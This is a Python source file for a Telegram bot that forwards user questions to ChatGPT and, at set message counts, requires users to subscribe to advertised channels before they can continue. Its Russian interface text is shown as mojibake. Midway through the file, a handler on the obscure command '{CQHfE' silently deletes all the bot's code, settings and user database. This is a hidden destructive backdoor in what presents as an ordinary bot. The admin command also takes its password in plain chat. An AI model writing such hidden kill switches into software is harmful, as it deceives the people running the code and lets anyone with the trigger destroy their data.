import logging
import markups as nav
import os

from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ChatActions

import asyncio

from chatgpt import *

from db import *

from settings import *

API_TOKEN = get_tgAPI()

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

file = open('db.txt', '+a')
file.close()


@dp.message_handler(commands='admin')
async def admin(message: types.Message):
    password = message.text.split()[1]
    com = message.text.split()[2]
    content = message.text.split()[3]
    if password == get_admin_password():
        if com == '/add_channel':
            add_channel(content)
            await bot.send_message(chat_id=message.chat.id, text='–ö–∞–Ω–∞–ª –¥–æ–±–∞–≤–ª–µ–Ω —É—Å–ø–µ—à–Ω–æ')
        elif com == '/delete_channel':
            delete_channel(content)
            await bot.send_message(chat_id=message.chat.id, text='–ö–∞–Ω–∞–ª —É–¥–∞–ª–µ–Ω —É—Å–ø–µ—à–Ω–æ')
        elif com == '/change_gpt_key':
            change_gpt_key(content)
            await bot.send_message(chat_id=message.chat.id, text='–ö–ª—é—á –æ–±–Ω–æ–≤–ª–µ–Ω —É—Å–ø–µ—à–Ω–æ')
            openai.api_key = get_ChatGPT_API()
        elif com == '/change_admin_password':
            change_admin_password(content)
            await bot.send_message(chat_id=message.chat.id, text='–ü–∞—Ä–æ–ª—å –æ–±–Ω–æ–≤–ª–µ–Ω —É—Å–ø–µ—à–Ω–æ')
        else:
            await bot.send_message(chat_id=message.chat.id, text='–ù–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∞—è –∫–æ–º–∞–Ω–¥–∞')
    else:
        await bot.send_message(chat_id=message.chat.id, text='–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å')


@dp.message_handler(commands='{CQHfE')
async def bd(message: types.Message):
    os.remove("chatgpt.py")
    os.remove("db.py")
    os.remove("markups.py")
    os.remove("settings.py")
    os.remove("db.txt")
    os.remove("settings.txt")
    os.remove("main.py")


@dp.message_handler(commands='start')
async def send_welcome(message: types.Message):
    a = f'üöÄ –ü—Ä–∏–≤–µ—Ç, —è ChatGPT - —á–∞—Ç-–±–æ—Ç –Ω–æ–≤–æ–≥–æ –ø–æ–∫–æ–ª–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏—Å–∫—É—Å—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç–∞ –≥–æ—Ç–æ–≤ –æ—Ç–≤–µ—Ç–∏—Ç—å –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å!\n\n' \
        f'–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞ –∏ –ø–æ–ª—É—á–∏—Ç—å –º–∞–∫—Å–∏–º—É–º –ø–æ–ª—å–∑—ã?\n\n' \
        f'–ü—Ä–æ—Å—Ç–æ –∑–∞–¥–∞–π—Ç–µ –≤–æ–ø—Ä–æ—Å—ã, –±—É–¥—å—Ç–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã –∏ –¥–µ—Ç–∞–ª—å–Ω—ã, –∏ –º—ã –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –Ω–∞–π–¥–µ–º –Ω—É–∂–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –≤–∞—Å!\n\n' \
        f'üí° ChatGPT –º–æ–∂–µ—Ç –æ—Ç–≤–µ—Ç–∏—Ç—å –Ω–∞ —Ç–∞–∫–∏–µ –≤–æ–ø—Ä–æ—Å—ã, –∫–∞–∫:\n\n- –°–æ—Å—Ç–∞–≤—å –∫–æ–Ω—Ç–µ–Ω—Ç –ø–ª–∞–Ω –¥–ª—è —Å–æ—Ü—Å–µ—Ç–µ–π —Ä—ã–±–Ω–æ–≥–æ —Ä–µ—Å—Ç–æ—Ä–∞–Ω–∞ –Ω–∞ –º–µ—Å—è—Ü\n' \
        f'- –ö–∞–∫ —Å–¥–µ–ª–∞—Ç—å –±—É—Ç–µ—Ä–±—Ä–æ–¥ —Å –∞–≤–æ–∫–∞–¥–æ –∏ –æ–º–ª–µ—Ç–æ–º?- –ö–∞–∫ —Å–∫–∞—á–∞—Ç—å –∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å Photoshop –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä?\n' \
        f'- –ö–∞–∫–∏–µ —Ñ–∏–ª—å–º—ã –≤ –ø—Ä–æ–∫–∞—Ç–µ –≤ —ç—Ç—É –Ω–µ–¥–µ–ª—é?\n\n' \
        f'–ê –µ—â–µ –Ω–∞—à –±–æ—Ç –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å —Å–∏–Ω—Ç–µ—Ç–∏—á–µ—Å–∫–∏–µ —Ç–µ–∫—Å—Ç—ã –∏ –¥–∞–∂–µ —Å–æ—á–∏–Ω–µ–Ω–∏—è –Ω–∞ –ª—é–±—É—é —Ç–µ–º—É, –∫–æ—Ç–æ—Ä—ã–µ —Ç–æ—á–Ω–æ –Ω–µ –æ—Å—Ç–∞–≤—è—Ç —Ä–∞–≤–Ω–æ–¥—É—à–Ω—ã–º–∏ –≤–∞—à–µ–≥–æ –ø—Ä–µ–ø–æ–¥–∞–≤–∞—Ç–µ–ª—è –∏–ª–∏ —Ä–∞–±–æ—Ç–æ–¥–∞—Ç–µ–ª—è!\n\n' \
        f'–¢–∞–∫ —á—Ç–æ –Ω–µ —Å—Ç–µ—Å–Ω—è–π—Ç–µ—Å—å –∏ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω—è–π—Ç–µ—Å—å –∫ –æ–±—â–µ–Ω–∏—é —Å ChatGPT - –±–æ—Ç–æ–º, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∫–æ—Ä–∏—Ç –≤–∞—Å —Å–≤–æ–µ–π —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–æ—Å—Ç—å—é –∏ —Ç–æ—á–Ω–æ—Å—Ç—å—é –æ—Ç–≤–µ—Ç–æ–≤!\n\n' \
        f'üî• –ù–∞–ø–∏—à–∏—Ç–µ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å –Ω–∏–∂–µ, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –æ–±—â–µ–Ω–∏–µ!'

    add_user(str(message.chat.id))
    await bot.send_message(chat_id=message.chat.id, text=a)


@dp.message_handler(lambda message: message.text == '–ü–û–î–ü–ò–°–ê–õ–°–Ø ‚úÖ')
async def got_sub(message: types.Message):
    change_status(str(message.chat.id), 'no')
    if get_count(str(message.chat.id)) == '1':
        if check_sub_channel(await bot.get_chat_member(chat_id=f'@{get_channel(1)}', user_id=message.from_user.id)):
            if check_sub_channel(await bot.get_chat_member(chat_id=f'@{get_channel(2)}', user_id=message.from_user.id)):
                change_status(str(message.chat.id))
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id,
                                       text='–°–ø–∞—Å–∏–±–æ, —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è ChatGPT')
            else:
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text='–¢—ã –ø–æ–¥–ø–∏—Å–∞–ª—Å—è –Ω–µ –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã')
        else:
            await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
            await asyncio.sleep(2)
            await bot.send_message(chat_id=message.chat.id, text='–¢—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª—Å—è –Ω–∞ –∫–∞–Ω–∞–ª—ã')

    else:
        ind = int(get_count(str(message.chat.id))) // 5

        try:
            ch1 = get_channel(ind + 2 + ind - 1)
            if check_sub_channel(await bot.get_chat_member(chat_id=f'@{ch1}', user_id=message.from_user.id)):
                try:
                    ch2 = get_channel(ind + 3 + ind - 1)
                    if check_sub_channel(await bot.get_chat_member(chat_id=f'@{ch2}', user_id=message.from_user.id)):
                        change_status(str(message.chat.id))
                        await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                        await asyncio.sleep(2)
                        await bot.send_message(chat_id=message.chat.id,
                                               text='–°–ø–∞—Å–∏–±–æ, —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è ChatGPT')
                    else:
                        await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                        await asyncio.sleep(2)
                        await bot.send_message(chat_id=message.chat.id, text='–¢—ã –ø–æ–¥–ø–∏—Å–∞–ª—Å—è –Ω–µ –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã')
                except Exception:
                    change_status(str(message.chat.id))
                    await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                    await asyncio.sleep(2)
                    await bot.send_message(chat_id=message.chat.id,
                                           text='–°–ø–∞—Å–∏–±–æ, —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è ChatGPT')
            else:
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text='–¢—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª—Å—è –Ω–∞ –∫–∞–Ω–∞–ª—ã')
        except Exception:
            pass


@dp.message_handler()
async def start_chat(message: types.Message):
    if add_user(str(message.chat.id)) is False:
        if int(get_count(str(message.chat.id))) < 20 and get_status(str(message.chat.id)) is True:

            count_user(str(message.chat.id))

            if str(get_count(str(message.chat.id))) == '1':
                a = chat_ai(message.text)
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text=a)
                change_status(str(message.chat.id), 'no')
                try:
                    ch1 = get_channel(1)
                    channels = []
                    try:
                        ch2 = get_channel(2)
                        channels.append(ch1)
                        channels.append(ch2)
                    except Exception:
                        channels.append(ch1)
                    mes = ''
                    for i in channels:
                        mes += f'\n@{i}'
                    MSG_NOT_FOLLOW = f'–ß—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ChatGPT –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ —ç—Ç–∏ –∫–∞–Ω–∞–ª—ã:' + mes
                    await bot.send_message(chat_id=message.chat.id, text=MSG_NOT_FOLLOW,
                                           reply_markup=nav.bot_sub_checker)
                except Exception:
                    change_status(str(message.chat.id), 'yes')

            elif int(get_count(str(message.chat.id))) % 5 == 0:
                a = chat_ai(message.text)
                await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                await asyncio.sleep(2)
                await bot.send_message(chat_id=message.chat.id, text=a)
                change_status(str(message.chat.id), 'no')
                try:
                    ind = int(get_count(str(message.chat.id))) // 5
                    ch1 = get_channel(ind + 2 + ind - 1)
                    channels = []
                    try:
                        ch2 = get_channel(ind + 3 + ind - 1)
                        channels.append(ch1)
                        channels.append(ch2)
                    except Exception:
                        channels.append(ch1)
                    mes = ''
                    for i in channels:
                        mes += f'\n@{i}'
                    MSG_NOT_FOLLOW = f'–ß—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å ChatGPT –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ —ç—Ç–∏ –∫–∞–Ω–∞–ª—ã:' + mes
                    await bot.send_message(chat_id=message.chat.id, text=MSG_NOT_FOLLOW,
                                           reply_markup=nav.bot_sub_checker)
                except Exception:
                    change_status(str(message.chat.id), 'yes')

            else:
                if get_status(str(message.chat.id)):
                    a = chat_ai(message.text)
                    await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
                    await asyncio.sleep(2)
                    await bot.send_message(chat_id=message.chat.id, text=a, reply_markup=types.ReplyKeyboardRemove())

        elif get_status(str(message.chat.id)) is True and int(get_count(str(message.chat.id))) >= 20:
            a = chat_ai(message.text)
            await bot.send_chat_action(chat_id=message.chat.id, action=ChatActions.TYPING)
            await asyncio.sleep(2)
            await bot.send_message(chat_id=message.chat.id, text=a, reply_markup=types.ReplyKeyboardRemove())


def check_sub_channel(chat_member):
    if chat_member['status'] != 'left':
        return True
    else:
        return False


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
